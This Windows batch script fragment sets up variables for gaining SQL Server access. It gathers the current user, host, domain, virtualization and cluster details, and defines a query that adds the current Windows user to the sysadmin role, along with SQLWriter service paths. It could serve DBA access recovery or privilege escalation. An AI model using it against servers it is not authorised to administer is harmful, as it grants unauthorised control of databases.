@ECHO OFF
::variables source
::main vars
type NUL > blank.txt
fc "user.txt" "blank.txt" > nul && ( FOR /F "tokens=* USEBACKQ" %%F IN (`whoami`) DO ( SET who=%%F ) ) || ( set /p who=<user.txt )
wmic computersystem get manufacturer | find "VMware" > nul && set virt=Virtualized || set virt=Physical
set who=%who: =%
set host=%COMPUTERNAME%
set domain=%USERDOMAIN%
set sc=fullscript.txt
set _cluerr=0
set scb=fullscript.bat
set tst=test-if-iam-sysadmin.bat
set sfound="mssql_founded.txt"
set scmd=SQLCMD.exe
set query=CREATE LOGIN [%who%] from windows; exec sp_addsrvrolemember '%who%', 'sysadmin';
set regp=HKLM\SYSTEM\CurrentControlSet\Services\SQLWriter
set writer=C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe
set ssmsvr=0
( FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist ^| findstr sqlservr.exe ^| find /c /v ""`) DO ( SET sqlcount=%%F ) ) 2> nul
( FOR /F "tokens=* USEBACKQ" %%F IN (`sc query ^|findstr ClusSv. ^| find /c /v ""`) DO ( SET sqlclust=%%F ) ) 2> nul
IF %sqlclust% geq 1 (
( FOR /F "tokens=* USEBACKQ" %%F IN (`REG QUERY HKLM\Cluster\Nodes ^| find "Nodes" /c`) DO ( SET "_nodes=%%F" ) ) 2> nul
( FOR /F "tokens=2*" %%a in ('REG QUERY HKLM\Cluster\ /v ClusterName') DO ( SET "_clun=%%b" ) ) 2> nul
)
::others
set _major=0
set many=0
cluster group 2>nul && set _cluerr=0 || set _cluerr=1
sc query |findstr .SQLB. >nul && Echo.SQLBrowser is running. && set _browser=1 || Echo.SQLBrowser is disabled. && set _browser=0
::files creation
echo. > %sfound%
type NUL > blank.txt